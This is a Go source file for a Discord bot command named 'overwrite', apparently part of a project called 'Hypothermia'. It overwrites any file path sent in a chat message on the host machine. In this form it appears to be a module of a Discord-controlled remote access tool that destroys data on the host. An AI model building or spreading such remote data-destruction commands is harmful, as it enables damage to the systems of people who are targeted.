package commands

import (
	"Hypothermia/src/utils"
	"os"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const (
	ovUsage string = "[path]"

	ovArgsError   string = "🟥 Expected 1 argument."
	ovInfoError   string = "🟥 Failed to get info about the path."
	ovDirError    string = "🟥 Path needs to be a file."
	ovFailedError string = "🟥 Failed to overwrite file."

	ovSuccess string = "🟩 Successfully overwritten file."
)

func (*OverwriteCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, ovArgsError+"\nUsage: "+ovUsage, m.Reference())
		return
	}

	var path string
	if strings.HasPrefix(args[0], "\"") {
		joined := strings.Join(args, " ")
		start := strings.Index(joined, "\"") + 1
		end := strings.Index(joined[start:], "\"") + start

		if start == 0 || end == -1 {
			s.ChannelMessageSendReply(m.ChannelID, uploadFormatError, m.Reference())
			return
		}

		path = joined[start:end]
	} else {
		path = args[0]
	}

	info, err := os.Stat(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, ovInfoError, m.Reference())
		return
	}

	if info.IsDir() {
		s.ChannelMessageSendReply(m.ChannelID, ovDirError, m.Reference())
		return
	}

	err = utils.OverwriteFile(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, ovFailedError, m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, ovSuccess, m.Reference())
}

func (*OverwriteCommand) Name() string {
	return "overwrite"
}

func (*OverwriteCommand) Info() string {
	return "overwrites a file"
}

type OverwriteCommand struct{}
